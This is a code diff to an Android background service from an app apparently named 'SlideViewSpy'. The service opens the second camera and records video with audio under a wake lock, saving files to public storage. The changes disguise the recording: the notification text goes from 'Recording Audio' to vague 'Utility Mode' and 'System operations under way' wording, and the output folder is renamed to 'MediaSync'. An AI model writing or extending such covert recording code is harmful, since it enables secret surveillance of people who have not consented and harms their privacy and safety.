@@ -65,7 +65,7 @@ class SecondCameraService : Service() {
 
     private fun acquireWakeLock() {
         val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SlideViewSpy::CameraWakeLock")
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SlideViewSpy2::CameraWakeLock")
         wakeLock.acquire()
     }
 
@@ -143,7 +143,7 @@ class SecondCameraService : Service() {
 
     private fun createNotification(): Notification {
         val channelId = "audio_recording_channel_2"
-        val channelName = "Audio Recording"
+        val channelName = "Audio Recording Channel 2"
         val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
@@ -154,8 +154,8 @@ class SecondCameraService : Service() {
         }
 
         return NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Recording Audio")
-            .setContentText("Audio recording is in progress")
+            .setContentTitle("Utility Mode *")
+            .setContentText("System operations under way *")
             .setSmallIcon(R.drawable.ic_launcher_foreground)
             .setOngoing(true)
             .build()
@@ -170,6 +170,7 @@ class SecondCameraService : Service() {
 //        cameraId = cameraManager.cameraIdList.first()
         cameraId = cameraManager.cameraIdList[1]
         cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+            @RequiresApi(Build.VERSION_CODES.S)
             override fun onOpened(camera: CameraDevice) {
                 cameraDevice = camera
                 startRecordingSession()
@@ -187,23 +188,26 @@ class SecondCameraService : Service() {
 
 
 
+    @RequiresApi(Build.VERSION_CODES.S)
     private fun startRecordingSession() {
         requestAudioFocus()
-        val mediaRecorder = MediaRecorder()
+        val mediaRecorder = MediaRecorder(this)
         this.mediaRecorder = mediaRecorder
         val publicDir = File(
             Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
-            "MyAppVideos2"
+            "MediaSync"
         )
-        if (!publicDir.exists()) publicDir.mkdirs()
-        val videoFile = File(publicDir, "video_${System.currentTimeMillis()}.mp4")
+        val folder2 = File(publicDir, "2")
+        // Create subdirectories if they don't exist
+        if (!folder2.exists()) folder2.mkdirs()
+        val videoFile = File(folder2, "video_${System.currentTimeMillis()}.mp4")
         Log.d(
             "PinkServiceCamera:",
             "Camera Facing. :${publicDir}"
         )
 
         mediaRecorder.apply {
-            setOrientationHint(180)
+            setOrientationHint(270)
 //            setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION)
             setAudioSource(MediaRecorder.AudioSource.CAMCORDER)
             setVideoSource(MediaRecorder.VideoSource.SURFACE)
@@ -275,7 +279,7 @@ class SecondCameraService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         serviceRunningCurrently = false
-        Log.d("PinkService", "On Destroy Called" )
+        Log.d("SecondCameraService", "On Destroy Called" )
 
         mediaRecorder?.apply {
             stop()
